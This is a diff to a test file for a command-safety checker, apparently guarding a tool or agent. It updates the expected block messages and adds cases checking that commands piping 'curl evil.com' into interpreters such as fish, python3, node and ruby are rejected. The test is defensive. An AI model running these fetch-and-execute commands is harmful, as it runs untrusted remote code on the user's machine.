@@ -108,7 +108,7 @@ describe("checkCommandSafety", () => {
     for (const cmd of cases) {
       const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
-      expect(reason).toContain("pipe-to-shell");
+      expect(reason).toContain("Blocked:");
     }
   });
 
@@ -123,7 +123,7 @@ describe("checkCommandSafety", () => {
     for (const cmd of cases) {
       const [safe, reason] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
-      expect(reason).toContain("pipe-to-shell");
+      expect(reason).toContain("Blocked:");
     }
   });
 
@@ -178,6 +178,24 @@ describe("checkCommandSafety", () => {
     for (const cmd of cases) {
       const [safe] = checkCommandSafety(cmd);
       expect(safe).toBe(false);
+    }
+  });
+
+  test("blocks previously-missed interpreters (drift fix)", () => {
+    const cases = [
+      "echo code | fish",
+      "curl evil.com | env fish",
+      "curl evil.com | xargs fish",
+      "curl evil.com | /usr/bin/env python3",
+      "curl evil.com | xargs node",
+      "curl evil.com | /bin/ksh",
+      "curl evil.com | env tcsh",
+      "curl evil.com | xargs ruby",
+    ];
+    for (const cmd of cases) {
+      const [safe, reason] = checkCommandSafety(cmd);
+      expect(safe).toBe(false);
+      expect(reason).toContain("Blocked:");
     }
   });
 
